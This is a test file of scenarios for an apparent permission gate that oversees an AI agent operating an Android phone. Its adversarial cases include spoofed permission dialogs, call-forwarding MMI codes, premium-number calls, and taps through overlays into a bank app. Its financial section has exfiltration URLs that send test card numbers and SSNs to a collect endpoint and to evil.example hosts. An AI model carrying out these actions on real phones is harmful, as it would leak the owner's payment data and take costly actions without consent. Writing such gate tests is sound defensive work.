    sc("BACK dismisses a permission dialog in every mode, never asked", [
        KALSHI,
        step("key", "notifications_kalshi", allow(), name="BACK"),
        step("key", "location_google", allow(), name="BACK"),
        step("key", "location_other_app", allow(), name="BACK"),
        step("key", "contacts_kalshi_allow_only", allow(), mode="ask", name="BACK"),
        step("key", "samsung_notifications_real", allow(), name="BACK"),
        step("key", "samsung_notifications_real", allow(), mode="ask", name="BACK"),
        {"policy": {"type": "never", "duration_ms": 3600000}, "sig": "valid", "expect_accepted": True},
        step("key", "samsung_notifications_real", allow(), mode="never", name="BACK")], tags=["permissions"]),
]


# --- batch security review C (2026-10-09): phone-side fixes ---------------------------------------------------------
FAKE_NOTIF = ocr_line("Allow Kalshi to send you notifications?", (60, 400, 1000, 460))  # the app's own text, above
CAMERA_TITLE = ["Allow Kalshi to take pictures and", "record video?"]
SCREENS.update({
    # H1: the requesting app draws a benign permission title above the real dialog (the OCR reads the whole screen).
    "ocr_camera": ocr_dialog(CAMERA_TITLE, LOC_BUTTONS, cards=False),
    "ocr_camera_spoof": ocr_dialog(CAMERA_TITLE, LOC_BUTTONS, cards=False, extra=[FAKE_NOTIF]),
    "ocr_contacts_spoof": ocr_dialog(["Allow Kalshi to access your", "contacts?"], ["Allow", "Don't allow"], cards=False,
                                     extra=[FAKE_NOTIF]),
    # ...or below it, with a fake Allow of its own.
    "ocr_camera_spoof_below": ocr_dialog(CAMERA_TITLE, LOC_BUTTONS, cards=False, extra=[
        ocr_line("Allow Kalshi to send you notifications?", (120, 1950, 960, 2000)),
        ocr_line("Allow", (300, 2080, 780, 2130))]),
    # M3: an app-drawn "Approximate" outside the dialog card.
    "ocr_location_fake_approx": ocr_dialog(LOC_TITLE, LOC_BUTTONS,
                                           extra=[ocr_line("Approximate", (400, 2250, 700, 2300))]),
    # M1: the same window, the same buttons, another question (content swapped in place).
    "ocr_contacts_other_swap": ocr_dialog(["Allow Tracker to access your", "contacts?"], LOC_BUTTONS, cards=False),
})

DIALER = "com.google.android.dialer"
LABELS.update({DIALER: "Phone", "com.samsung.android.dialer": "Phone", "com.android.dialer": "Phone",
               "com.samsung.android.lool": "Device care"})


def dialer(package, number, call_desc="dial", call_id="dialpad_voice_call_button", focused=True):
    return screen(app(package, [
        node(id=f"{package}:id/digits", cls="android.widget.EditText", text=number, editable=True, focused=focused,
             bounds=(40, 300, 1040, 420)),
        button("#", f"{package}:id/pound", (700, 1700, 1040, 1850)),
        button("", f"{package}:id/{call_id}", (390, 2000, 690, 2150), desc=call_desc),
        button("Call history", f"{package}:id/call_history", (0, 2200, 540, 2300))]), labels=LABELS)


CALL_BTN, POUND, CALL_HISTORY = dict(x=540, y=2075), dict(x=870, y=1775), dict(x=270, y=2250)
SCREENS.update({
    "dialer_google": dialer(DIALER, "+1 900-555-0100"),
    "dialer_google_mmi": dialer(DIALER, "**21*5550100#"),
    "dialer_google_code": dialer(DIALER, "**21*5550100"),  # the # key would complete the code
    # As read on the API 35 emulator: Google Phone's dialpad (with Call) is drawn above a later full-screen sibling by
    # elevation, so the hit path ends in that layer and never reaches the button.
    "dialer_google_layered": screen(app(DIALER, [
        node(cls="android.view.ViewGroup", bounds=(0, 128, W, 2337), children=[
            node(id=f"{DIALER}:id/digits", cls="android.widget.EditText", text="(555) 123-4567", editable=True,
                 bounds=(147, 1196, 933, 1340)),
            button("Call", f"{DIALER}:id/dialpad_voice_call_button", (413, 2158, 667, 2305), desc="dial")]),
        node(id=f"{DIALER}:id/main_screen_coordinator_layout", cls="android.view.ViewGroup", bounds=(0, 128, W, 2337),
             children=[node(id=f"{DIALER}:id/result_container", cls="android.widget.ScrollView",
                            bounds=(0, 128, W, 2337))])]), labels=LABELS),
    "dialer_samsung": dialer("com.samsung.android.dialer", "5551234", call_desc="Call", call_id="dialButton"),
    "dialer_aosp": dialer("com.android.dialer", "5551234", call_desc="Call", call_id="dialpad_floating_action_button"),
    "incall_google": screen(app(DIALER, [
        button("", f"{DIALER}:id/incall_end_call", (390, 2000, 690, 2150), desc="End call"),
        button("", f"{DIALER}:id/incall_add_call", (40, 1700, 340, 1850), desc="Add call")]), labels=LABELS),
    "whatsapp_header": screen(app("com.whatsapp", [
        button("", "com.whatsapp:id/menuitem_voice_call", (800, 100, 920, 220), desc="Voice call"),
        button("", "com.whatsapp:id/menuitem_video_call", (920, 100, 1040, 220), desc="Video call")]), labels=LABELS),
    # M2: a focused field, and another one where focus moved before the gesture.
    "form_a": screen(app("com.example.app", [
        node(id="com.example.app:id/name", cls="android.widget.EditText", editable=True, focused=True,
             bounds=(40, 400, 1040, 500)),
        node(id="com.example.app:id/note", cls="android.widget.EditText", editable=True, bounds=(40, 600, 1040, 700))]),
        labels=LABELS),
    "form_b": screen(app("com.example.app", [
        node(id="com.example.app:id/name", cls="android.widget.EditText", editable=True, bounds=(40, 400, 1040, 500)),
        node(id="com.example.app:id/note", cls="android.widget.EditText", editable=True, focused=True,
             bounds=(40, 600, 1040, 700))]), labels=LABELS),
    # M4: Samsung's Device care (Battery and Storage open there).
    "devicecare_home": screen(app("com.samsung.android.lool", [
        node(text="Device care", id="com.samsung.android.lool:id/title", bounds=(48, 150, 900, 260)),
        row("Battery", 420), row("Device protection", 560)], title="Device care"), labels=LABELS),
    "devicecare_background_limits": screen(app("com.samsung.android.lool", [
        node(text="Background usage limits", id="com.samsung.android.lool:id/title", bounds=(48, 150, 900, 260)),
        row("Put unused apps to sleep", 420, checked=True)], title="Background usage limits"), labels=LABELS),
    # L1: the global per-app notification list.
    "settings_app_notifications_list": settings("App notifications", [
        ("Chase", 420, "android:id/title", True), ("OpenMob", 560, "android:id/title", True),
        ("Chrome", 700, "android:id/title", True)]),
    # Phase 5 item 1: OpenMob's own approval prompt on top.
    "own_prompt": screen(app("dev.openmob.companion", [
        button("Allow", "dev.openmob.companion:id/allow", (40, 1800, 1040, 1950))], id=9, layer=9), labels=LABELS),
})
SCREENS["launcher"]["resolve"]["tel:**21*5551234%23"] = {"package": DIALER}

SCENARIOS += [
    sc("OCR H1: a permission-style title the app drew above the real dialog makes every grant ask", [
        KALSHI,
        step("tap", "ocr_camera", ask("permission", rule="risk:permission:camera"), **WHILE_USING),
        step("tap", "ocr_camera", allow(), **ONCE),
        step("tap", "ocr_camera_spoof", ask("permission", level="tap", rule="risk:permission:ocr_unsure"), **WHILE_USING),
        step("tap", "ocr_camera_spoof", ask("permission", rule="risk:permission:ocr_unsure"), **ONCE),
        step("tap", "ocr_camera_spoof", allow(), **DENY_BTN),
        step("tap", "ocr_camera_spoof_below", ask("permission", rule="risk:permission:ocr_unsure"), **WHILE_USING),
        step("tap", "ocr_contacts_spoof", ask("permission", rule="risk:permission:ocr_unsure"), x=540, y=1505)],
       tags=["permissions", "ocr", "review_c"]),
    sc("OCR M3: an app-drawn Approximate outside the card is no card choice", [
        KALSHI,
        step("tap", "ocr_location_fake_approx", ask("permission", rule="risk:permission:unknown"), x=550, y=2275),
        {"cancel": "last"}, {"advance_ms": 2000},
        step("tap", "ocr_location_fake_approx", refuse("gate_permission_choice", rule="permission:location_accuracy"),
             **ONCE),
        step("tap", "ocr_location_fake_approx", allow(), **APPROX),  # the real card
        step("tap", "ocr_location_fake_approx", allow(), **ONCE)], tags=["permissions", "ocr", "review_c"]),
    sc("OCR M1: an approval binds the dialog's question; the same button under another question asks again", [
        KALSHI,
        step("tap", "ocr_location_other", ask("permission", rule="risk:permission:other_app"), **WHILE_USING),
        {"approve": "last", "sig": "valid"},
        step("tap", "ocr_contacts_other_swap", ask("permission", rule="risk:permission:other_app"), **WHILE_USING)],
       tags=["permissions", "ocr", "review_c"]),
    sc("M2: typing, ENTER and DELETE with no field the gate can judge are refused", [
        step("type_text", "kalshi_app", refuse("gate_screen_unstable", rule="builtin:no_field"), text="hello"),
        step("key", "kalshi_app", refuse("gate_screen_unstable", rule="builtin:no_field"), name="ENTER"),
        step("key", "kalshi_app", refuse("gate_screen_unstable", rule="builtin:no_field"), name="DELETE"),
        step("key", "kalshi_app", allow(), name="BACK"),
        step("type_text", "form_a", allow(), text="hello")], tags=["hard_deny", "review_c"]),
    sc("M2/L3: focus moving to another field before the text lands is refused", [
        step("type_text", "form_a", refuse("gate_screen_changed", rule="builtin:field_changed"), reverify="form_b",
             text="hello"),
        step("key", "form_a", refuse("gate_screen_changed", rule="builtin:field_changed"), reverify="form_b",
             name="DELETE")], tags=["review_c"]),
    sc("H2: placing a call asks; an MMI code asks with the screen lock; the dialer opening doesn't", [
        step("open_url", "launcher", allow(), url="tel:5551234"),
        step("tap", "dialer_google", ask("call", level="tap", rule="risk:call:dial"), **CALL_BTN),
        step("tap", "dialer_google", allow(), **CALL_HISTORY),
        step("tap", "dialer_google", allow(), **POUND),  # a # after a plain number completes no code
        step("tap", "dialer_google_code", ask("call_code", level="fingerprint", rule="risk:call:mmi"), **POUND),
        step("tap", "dialer_google_code", ask("call_code", level="fingerprint", rule="risk:call:mmi"), **CALL_BTN),
        step("tap", "dialer_google_mmi", ask("call_code", level="fingerprint", rule="risk:call:mmi"), **CALL_BTN),
        step("tap", "dialer_google_layered", ask("call", level="tap", rule="risk:call:dial"), x=540, y=2231),
        step("tap", "dialer_samsung", ask("call", level="tap"), **CALL_BTN),
        step("tap", "dialer_aosp", ask("call", level="tap"), **CALL_BTN),
        step("tap", "incall_google", allow(), x=540, y=2075),  # End call
        step("tap", "incall_google", ask("call"), x=190, y=1775),  # Add call
        step("tap", "whatsapp_header", ask("call", rule="risk:call:button"), x=860, y=160),
        step("tap", "whatsapp_header", ask("call", rule="risk:call:button"), x=980, y=160)], tags=["calls", "review_c"]),
    sc("H2: typing a code or pressing ENTER in the dialer", [
        step("type_text", "dialer_google", allow(), text="5551234"),
        step("type_text", "dialer_google", ask("call_code", level="fingerprint"), text="*#06#"),
        step("key", "dialer_google", ask("call", rule="risk:call:enter"), name="ENTER"),
        step("key", "dialer_google_mmi", ask("call_code", level="fingerprint"), name="ENTER"),
        # Owner, 2026-10-10: one prompt, at the dialing. The link itself only opens the dialer.
        step("open_url", "launcher", allow(), url="tel:**21*5551234%23")],
       tags=["calls", "review_c"]),
    sc("H2: Don't confirm everyday actions doesn't cover calls; Don't ask refuses codes", [
        EVERYDAY,
        step("tap", "dialer_google", ask("call"), **CALL_BTN),
        {"policy": {"type": "never", "duration_ms": 3600000}, "sig": "valid", "expect_accepted": True},
        step("tap", "dialer_google_mmi", refuse("gate_denied", rule="never:call:mmi"), mode="never", **CALL_BTN)],
       tags=["calls", "modes", "review_c"]),
    sc("M4: Samsung's Device care is judged as Settings", [
        step("tap", "devicecare_home", refuse("gate_denied_page"), x=540, y=620),  # Device protection
        step("tap", "devicecare_home", allow(), x=540, y=480),  # Battery: everyday
        step("tap", "devicecare_background_limits", ask("settings", level="fingerprint"), x=540, y=480)],
       tags=["settings", "review_c"]),
    sc("M5: no task prompt while paused after 3 denials", [
        *[s for i in range(3) for s in (task_grant(ask("task"), task=f"t{i}", text=f"share video {i}"), {"deny": "last"})],
        task_grant(refuse("gate_rate_limited", rule="builtin:suspended"), task="t9", text="share video 9"),
        {"resume": True},
        task_grant(ask("task"), task="t9", text="share video 9")], tags=["limits", "review_c"]),
    sc("L1: notification switches for a blocked app or OpenMob ask; others don't", [
        step("tap", "settings_app_notifications_list", ask("settings"), x=540, y=480),
        step("tap", "settings_app_notifications_list", ask("settings"), x=540, y=620),
        step("tap", "settings_app_notifications_list", allow(), x=540, y=760)], tags=["settings", "review_c"]),
    sc("Phase 5 item 1: a gesture onto the phone's own prompt while it waits says wait (gate_prompt_open)", [
        step("tap", "own_prompt", refuse("gate_denied_page", rule="builtin:own_window"), x=540, y=1875),
        step("tap", "whatsapp_chat", ask("send"), **SEND),
        step("tap", "own_prompt", refuse("gate_prompt_open", rule="builtin:prompt_open"), x=540, y=1875)],
       keep_open=True, tags=["review_c"]),
]

ADVERSARIAL += [
    sc("H1: a fake notifications title above a camera dialog, then While using the app",
       [KALSHI, step("tap", "ocr_camera_spoof", ask("permission"), **WHILE_USING)]),
    sc("H1: a fake notifications title above a contacts dialog, then Allow",
       [KALSHI, step("tap", "ocr_contacts_spoof", ask("permission"), x=540, y=1505)]),
    sc("H2: Call on a premium number the dialer shows (after a tel: link)",
       [step("tap", "dialer_google", ask("call"), **CALL_BTN)]),
    sc("H2: complete a forwarding code with the dialpad's # key", [step("tap", "dialer_google_code", ask("call_code"), **POUND)]),
    sc("H2: dial **21*<number># (call forwarding)", [step("tap", "dialer_google_mmi", ask("call_code"), **CALL_BTN),
                                                     step("type_text", "dialer_google", ask("call_code"), text="**21*5550100#")]),
    sc("install an app the task doesn't name", [
        step("tap", "play_store_flashlight_get", ask("install"), x=540, y=860, task="t1", task_text="check the weather")]),
    sc("M2: type with no judged field", [step("type_text", "kalshi_app", refuse("gate_screen_unstable"), text="123456")]),
]


# --- the gate's hit test, for every risk kind (2026-10-10): a tap is judged by every clickable or labeled node under
# the point, whatever the drawing order; the strictest verdict wins. The hit path follows the last child containing the
# point, so each screen below puts the risky control in an EARLIER sibling than a full-screen layer.
def layer(top=0, bottom=H, children=()):
    """A full-screen layer drawn later in the tree (a coordinator, a search overlay) with nothing at the tap point."""
    return node(cls="android.view.ViewGroup", bounds=(0, top, W, bottom), children=[
        node(cls="android.widget.ScrollView", id="result_container", bounds=(0, top, W, bottom), children=list(children))])


SHOP = "com.example.shop"
LABELS[SHOP] = "Example Shop"
SCREENS.update({
    "hit_buy_layered": screen(app(SHOP, [
        node(cls="android.widget.LinearLayout", bounds=(0, 200, W, 2300), children=[
            node(text="Wireless earbuds", bounds=(40, 300, 1040, 380)),
            node(text="$49.99", bounds=(40, 400, 400, 460)),
            button("Add to cart", f"{SHOP}:id/add_to_cart", (40, 1500, 1040, 1620)),
            button("Buy now", f"{SHOP}:id/buy_now", (40, 1660, 1040, 1780))]),
        layer()]), labels=LABELS),
    "hit_place_order_layered": screen(app(AMAZON, [
        node(cls="android.widget.LinearLayout", bounds=(0, 200, W, 2300), children=[
            node(text="Order total: $49.99", bounds=(40, 1400, 1040, 1460)),
            button("Place your order", "placeOrder", (40, 1600, 1040, 1720))]),
        layer()]), labels=LABELS),
    "hit_send_toolbar": screen(app("com.whatsapp", [
        node(cls="android.widget.LinearLayout", bounds=(0, 2160, W, 2340), children=[
            node(id="com.whatsapp:id/entry", cls="android.widget.EditText", text="hi", editable=True,
                 bounds=(20, 2180, 880, 2320)),
            button("", "com.whatsapp:id/send", (900, 2190, 1060, 2310), desc="Send")]),
        node(cls="androidx.recyclerview.widget.RecyclerView", id="com.whatsapp:id/conversation", bounds=(0, 200, W, 2400),
             children=[node(text="see you at 5", bounds=(40, 1800, 700, 1880))])]), labels=LABELS),
    "hit_settings_layered": settings("Mystery tweaks", [("Turbo mode", 420, "android:id/title", False)],
                                     extra_nodes=[layer()]),
    "hit_delete_layered": screen(app("com.google.android.apps.photos", [
        node(cls="android.widget.LinearLayout", bounds=(0, 2100, W, 2300), children=[
            button("", "com.google.android.apps.photos:id/trash", (800, 2120, 1000, 2280), desc="Move to trash")]),
        layer()]), labels=LABELS),
    "hit_install_layered": screen(app("com.android.vending", [
        node(cls="android.widget.LinearLayout", bounds=(0, 200, W, 1000), children=[
            node(text="Torchlight: Flashlight Pro", bounds=(40, 300, 1040, 400)),
            button("Install", "com.android.vending:id/install_button", (40, 800, 1040, 920))]),
        layer()]), labels=LABELS),
    # An app's window over part of a blocked app: a tap there may reach the bank.
    "hit_overlay_over_bank": screen(app("com.chase.sig.android", [button("Transfer", "transfer", (40, 1600, 1040, 1720))]),
        {"id": 3, "type": "application", "layer": 3, "package": "com.example.app", "title": "", "bounds": [0, 1500, W, 2000],
         "root": node(cls="android.widget.FrameLayout", bounds=(0, 1500, W, 2000), children=[
             button("OK", "com.example.app:id/ok", (40, 1700, 1040, 1800))])}, labels=LABELS),
    # Ordinary layered screens: nothing risky under the point.
    "hit_benign_layered": screen(app(SHOP, [
        node(cls="android.widget.LinearLayout", bounds=(0, 200, W, 2300), children=[
            node(text="Wireless earbuds", bounds=(40, 300, 1040, 380)),
            button("Search", f"{SHOP}:id/search", (40, 1000, 1040, 1100)),
            button("Add to cart", f"{SHOP}:id/add_to_cart", (40, 1500, 1040, 1620))]),
        layer()]), labels=LABELS),
})
SCENARIOS += [
    sc("hit test: a risky control drawn above a later full-screen layer is still judged", [
        step("tap", "hit_buy_layered", ask("pay", money="start"), x=540, y=1720),
        step("tap", "hit_place_order_layered", ask("pay", money="terminal"), x=540, y=1660),
        step("tap", "hit_send_toolbar", ask("send"), x=980, y=2250),
        step("tap", "hit_settings_layered", ask("settings", level="fingerprint"), x=540, y=480),
        step("tap", "hit_delete_layered", ask("delete"), x=900, y=2200),
        step("tap", "hit_install_layered", ask("install"), x=540, y=860, task="t1", task_text="check the weather"),
        step("tap", "hit_overlay_over_bank", refuse("gate_blocked_app", rule="builtin:sensitive_apps"), x=540, y=1750)],
       tags=["hit_test"]),
    sc("hit test: ordinary taps on layered screens don't start asking", [
        step("tap", "hit_benign_layered", allow(), x=540, y=1050),
        step("tap", "hit_benign_layered", allow(), x=540, y=1560),
        step("tap", "hit_benign_layered", allow(), x=540, y=340),
        step("tap", "hit_buy_layered", allow(), x=540, y=1560),  # Add to cart, next to Buy now
        step("tap", "hit_send_toolbar", allow(), x=400, y=2250),  # the message field
        {"instruction": "install the torchlight app"},
        step("tap", "hit_install_layered", allow(), x=540, y=860, task="t1", task_text="install the torchlight app"),
        step("tap", "hit_overlay_over_bank", refuse("gate_blocked_app"), x=540, y=300)], tags=["hit_test", "friction"]),
]
ADVERSARIAL += [
    sc("Buy now drawn above a later full-screen layer", [step("tap", "hit_buy_layered", ask("pay"), x=540, y=1720)]),
    sc("Send in a toolbar over the conversation", [step("tap", "hit_send_toolbar", ask("send"), x=980, y=2250)]),
    sc("tap through an app's window into a blocked app under it",
       [step("tap", "hit_overlay_over_bank", refuse("gate_blocked_app"), x=540, y=1750)]),
]


# --- bug and optimization review, 2026-10-10 ---------------------------------------------------------------------------
# A scroll over a web page or list: the content under the finger moves, it isn't pressed (the owner's Samsung asked
# "Allow sliding 'Proud host of Wikipedia…'" for a scroll down in Chrome). Sliders and slide-to controls still ask,
# now found anywhere under the start, not only on the hit path.
WIKI = "com.android.chrome"
SCREENS.update({
    "wiki_page": screen(app(WIKI, [
        node(cls="android.webkit.WebView", bounds=(0, 200, W, H), scroll=["down", "up"], children=[
            node(cls="android.view.View", bounds=(0, 200, W, H), clickable=True, children=[
                node(text="Proud host of Wikipedia and other free knowledge projects", bounds=(40, 220, 1040, 300)),
                button("Donate now", "", (40, 320, 400, 400)),
                node(text="The Golden Gate Bridge is a suspension bridge", bounds=(40, 1700, 1040, 1900))])])]),
        labels=LABELS),
    "seekbar_layered": screen(app(SHOP, [
        node(cls="androidx.recyclerview.widget.RecyclerView", bounds=(0, 200, W, H), children=[
            node(desc="Tip amount", cls="android.widget.SeekBar", bounds=(40, 1700, 1040, 1800)),
            node(cls="android.widget.FrameLayout", bounds=(0, 1500, W, 2000))])]), labels=LABELS),
    "swipe_up_pay": screen(app(SHOP, [
        node(cls="android.widget.ScrollView", bounds=(0, 200, W, H), scroll=["down"], children=[
            node(text="Total $20.00", bounds=(40, 400, 1040, 480)),
            node(desc="Swipe up to pay $20.00", cls="android.view.View", bounds=(40, 1900, 1040, 2100), clickable=True)])]),
        labels=LABELS),
    "list_row_delete": screen(app(SHOP, [
        node(cls="androidx.recyclerview.widget.RecyclerView", bounds=(0, 200, W, H), children=[
            node(cls="android.widget.LinearLayout", bounds=(0, 600, W, 760), clickable=True, children=[
                node(text="Delete draft", bounds=(40, 620, 800, 700))])])]), labels=LABELS),
    "store_tap_titans": screen(app("com.android.vending", [
        node(text="Tap Titans 2: Clicker RPG", bounds=(40, 300, 1040, 400)),
        button("Install", "com.android.vending:id/install_button", (40, 800, 1040, 920))]), labels=LABELS),
})
SCENARIOS += [
    sc("a scroll over a web page's links and words doesn't ask (Wikipedia in Chrome, 2026-10-10)", [
        step("swipe", "wiki_page", allow(), x1=540, y1=1800, x2=540, y2=600, duration_ms=400),
        step("swipe", "wiki_page", allow(), x1=540, y1=600, x2=540, y2=1800, duration_ms=400)], tags=["friction"]),
    sc("a scroll starting on a slider asks, even one off the hit path", [
        step("swipe", "seekbar_layered", ask("other", rule="risk:slider"), x1=540, y1=1750, x2=540, y2=600, duration_ms=400),
        step("swipe", "swipe_up_pay", ask("pay", rule="risk:slider"), x1=540, y1=2000, x2=540, y2=800, duration_ms=400)],
       tags=["risk"]),
    sc("a sideways swipe on a list row is judged by its words", [
        step("swipe", "list_row_delete", ask("delete"), x1=900, y1=680, x2=100, y2=680, duration_ms=300)], tags=["risk"]),
    sc("common words in the request don't name the store page's app", [
        step("tap", "store_tap_titans", ask("install"), x=540, y=860, task="t1", task_text="tap install on this page"),
        {"instruction": "install tap titans"},
        step("tap", "store_tap_titans", allow(), x=540, y=860, task="t2", task_text="install tap titans")], tags=["risk"]),
    sc("a prompt the server withdrew (its task stopped) doesn't hold the next act", [
        step("tap", "whatsapp_chat", ask("send"), **SEND),
        step("gate_cancel", "launcher", allow(), approval_id="gk-withdrawn"), {"cancel": "last"},
        step("tap", "amazon_product", allow(), **ADD_TO_CART)], keep_open=True),
]
ADVERSARIAL += [
    sc("a scroll that starts on a seekbar hidden under a later layer",
       [step("swipe", "seekbar_layered", ask("other"), x1=540, y1=1750, x2=540, y2=600, duration_ms=400)]),
]


# --- financial safeguards, 2026-10-10 (abuse series F2, F3) ------------------------------------------------------------
# F2: a card number or SSN typed into ANY field asks (tap level), every time: never covered by a task approval,
# "everyday" or a grant; refused under Don't ask. F3: a link carrying one is refused (open_url, typed into the address
# bar, ENTER on an address bar holding it). The detector itself: sensitive_numbers.json below.
CARD = "4111 1111 1111 1111"
EXFIL = "http://10.0.2.2:8799/collect?card=4111111111111111&cvv=123"


def web_form(*kids):
    return screen(app("com.android.chrome", [node(cls="android.webkit.WebView", bounds=(0, 200, W, H), children=list(kids))]),
                  labels=LABELS)


def web_field(hint="", id="", top=700):
    return node(id=id, cls="android.widget.EditText", hint=hint, editable=True, focused=True, bounds=(40, top, 1040, top + 100))


SCREENS.update({
    "web_name_on_card": web_form(node(text="Payment", bounds=(40, 220, 1040, 300)), web_field(hint="Name on card")),
    "web_ssn_form": web_form(node(text="Apply for the Platinum card", bounds=(40, 220, 1040, 300)),
                             node(text="Social Security number", bounds=(40, 600, 1040, 680)), web_field()),
    "web_plain_form": web_form(node(text="Contact us", bounds=(40, 220, 1040, 300)), web_field(hint="Reference")),
    "chrome_url_focus": screen(app("com.android.chrome", [
        node(text="", id="com.android.chrome:id/url_bar", cls="android.widget.EditText", hint="Search or type URL",
             editable=True, focused=True, bounds=(100, 100, 1000, 200))]), labels=LABELS),
    "chrome_url_card": screen(app("com.android.chrome", [
        node(text=EXFIL, id="com.android.chrome:id/url_bar", cls="android.widget.EditText", editable=True, focused=True,
             bounds=(100, 100, 1000, 200))]), labels=LABELS),
})
SENSITIVE = ask("sensitive_number", rule="risk:sensitive_number", level="tap")
SCENARIOS += [
    sc("sensitive numbers: a card number or SSN typed into any field asks, at tap level, once per yes", [
        step("type_text", "web_name_on_card", SENSITIVE, text=CARD),
        {"approve": "last", "sig": "valid"},
        step("type_text", "web_name_on_card", allow(), text=CARD),  # the approved act, once
        step("type_text", "web_name_on_card", SENSITIVE, text=CARD),  # and only once
        step("type_text", "compose_field", SENSITIVE, text="my card 4111-1111-1111-1111 12/29 123"),
        step("type_text", "compose_field", SENSITIVE, text="4111111111111111"),
        step("type_text", "compose_field", SENSITIVE, text="378282246310005"),  # Amex, 15 digits
        step("type_text", "web_ssn_form", SENSITIVE, text="000-12-3456"),  # a test SSN where the page says SSN
        step("type_text", "web_ssn_form", SENSITIVE, text="000123456"),
        step("type_text", "web_plain_form", SENSITIVE, text="123-45-6789"),  # a valid SSN shape anywhere
        step("type_text", "compose_webview", ask("fill", rule="risk:card_field", level="fingerprint"), text=CARD)],
       tags=["sensitive_number"]),
    sc("sensitive numbers: phone numbers, order numbers, dates and near-misses don't ask", [
        step("type_text", "compose_field", allow(), text="Call me at 415-555-2671"),
        step("type_text", "compose_field", allow(), text="+1 415 555 2671 or +49 1512 3456789"),
        step("type_text", "compose_field", allow(), text="Order 112-1234567-1234567"),
        step("type_text", "compose_field", allow(), text="Meet on 2026-10-10 at 5"),
        step("type_text", "compose_field", allow(), text="4111 1111 1111 1112"),  # fails the Luhn check
        step("type_text", "compose_field", allow(), text="1760000000000"),  # a millisecond timestamp
        step("type_text", "web_plain_form", allow(), text="000-12-3456"),  # an invalid SSN with no SSN label
        step("type_text", "web_plain_form", allow(), text="123456789")], tags=["sensitive_number", "friction"]),
    sc("sensitive numbers: a task approval doesn't cover typing one", [
        task_grant(ask("task"), text="text my card number to Mom"), {"approve": "last", "sig": "valid"},
        step("type_text", "compose_field", SENSITIVE, text=CARD, task="t1", task_text="text my card number to Mom")],
       tags=["sensitive_number", "task_grant"]),
    sc("sensitive numbers: \"everyday\" doesn't cover typing one", [
        EVERYDAY, step("type_text", "compose_field", SENSITIVE, text=CARD)], tags=["sensitive_number"]),
    sc("sensitive numbers: refused under Don't ask", [
        {"policy": {"type": "never", "duration_ms": 3600000}, "sig": "valid", "expect_accepted": True},
        step("type_text", "compose_field", refuse("gate_denied", rule="never:sensitive_number"), mode="never", text=CARD),
        step("type_text", "web_ssn_form", refuse("gate_denied", rule="never:sensitive_number"), mode="never",
             text="000-12-3456"),
        step("type_text", "compose_field", allow(), mode="never", text="On my way")], tags=["sensitive_number", "modes"]),
    sc("links carrying a card number or SSN are refused, however they're written", [
        step("open_url", "launcher", refuse("gate_denied", rule="builtin:sensitive_link"), url=EXFIL),
        step("open_url", "launcher", refuse("gate_denied", rule="builtin:sensitive_link"),
             url="http://10.0.2.2:8799/collect?card=4111%201111%201111%201111"),
        step("open_url", "launcher", refuse("gate_denied", rule="builtin:sensitive_link"),
             url="http://10.0.2.2:8799/collect?card=4111%2B1111%2B1111%2B1111"),
        step("open_url", "launcher", refuse("gate_denied", rule="builtin:sensitive_link"),
             url="http://10.0.2.2:8799/collect?card=4111%25201111%25201111%25201111"),  # encoded twice
        step("open_url", "launcher", refuse("gate_denied", rule="builtin:sensitive_link"),
             url="https://evil.example/p/4111-1111-1111-1111"),
        step("open_url", "launcher", refuse("gate_denied", rule="builtin:sensitive_link"),
             url="https://evil.example/#c=4111111111111111"),
        step("open_url", "launcher", refuse("gate_denied", rule="builtin:sensitive_link"),
             url="https://evil.example/apply?ssn=000-12-3456"),
        step("open_url", "launcher", refuse("gate_denied", rule="builtin:sensitive_link"),
             url="https://4111111111111111.evil.example/"),
        step("type_text", "chrome_url_focus", refuse("gate_denied", rule="builtin:sensitive_link"), text=EXFIL),
        step("key", "chrome_url_card", refuse("gate_denied", rule="builtin:sensitive_link"), name="ENTER"),
        step("open_url", "launcher", allow(), url="https://example.com/"),
        step("open_url", "launcher", allow(), url="https://maps.example/@37.7749295,-122.41941550000001,15z"),
        step("open_url", "launcher", allow(), url="https://shop.example/order/112-1234567-1234567?t=1760000000000"),
        step("open_url", "launcher", allow(), url="tel:+4915123456789")], tags=["sensitive_number", "hard_deny"]),
]
ADVERSARIAL += [
    sc("card digits typed into 'Name on card' (abuse D20b)",
       [step("type_text", "web_name_on_card", ask("sensitive_number"), text=CARD)]),
    sc("an SSN typed into an unlabeled field under an SSN label (abuse D23)",
       [step("type_text", "web_ssn_form", ask("sensitive_number"), text="000-12-3456")]),
    sc("a card number sent out in a link's query (abuse D21b)",
       [step("open_url", "launcher", refuse("gate_denied", rule="builtin:sensitive_link"), url=EXFIL)]),
]

# The detector on its own, shared by the server (openmob/agent/sensitive.py), the phone (SensitiveNumbers.kt) and the
# reference engine: {"text", "ssn_context", "card_field", "expect"} and {"url", "expect"} (expect: "card", "ssn" or null).
# --- the agent-is-in-control indicator (2026-10-17, docs/design/control-indicator.md) ------------------------------------
# OpenMob's own accessibility overlays: a full-screen glowing border (FLAG_NOT_TOUCHABLE, no clickable node: touches pass
# through it) and a small Stop pill in a corner (the only touchable part: an agent's tap there is refused, never judged
# on the app under it). Reads ignore both: they are neither unknown windows nor permission dialogs.
OWN = "dev.openmob.companion"
PILL = (900, 140, 1060, 272)


def border_overlay(id=20, layer=30):
    return {"id": id, "type": "accessibility_overlay", "layer": layer, "package": OWN, "title": "", "bounds": FULL,
            "root": node(cls="OpenMobOverlay", bounds=FULL)}


def pill_overlay(id=21, layer=31, bounds=PILL):
    return {"id": id, "type": "accessibility_overlay", "layer": layer, "package": OWN, "title": "", "bounds": list(bounds),
            "root": node(cls="OpenMobOverlay", bounds=bounds, clickable=True)}


SCREENS.update({
    "indicator_over_shop": screen(app(SHOP, [
        node(cls="android.widget.LinearLayout", bounds=(0, 100, W, 2300), children=[
            button("Menu", f"{SHOP}:id/menu", (940, 150, 1060, 260)),  # under the pill
            node(text="Wireless earbuds", bounds=(40, 300, 1040, 380)),
            button("Search", f"{SHOP}:id/search", (0, 1000, W, 1100)),
            button("Buy now", f"{SHOP}:id/buy_now", (0, 1660, W, 1780))])]),
        border_overlay(), pill_overlay(), labels=LABELS),
    # The pill over a bank's window: refused as the pill, never reaching the bank.
    "indicator_over_bank": screen(app("com.chase.sig.android", [button("Transfer", "transfer", (900, 150, 1060, 260))]),
        border_overlay(), pill_overlay(), labels=LABELS),
    # OpenMob's own settings card for the indicator (MainActivity).
    "openmob_indicator_settings": screen(app(OWN, [
        node(text="Agent indicator", bounds=(60, 300, 1020, 380)),
        node(text="Glowing border", cls="android.widget.Switch", bounds=(60, 420, 1020, 500), clickable=True, checked=True),
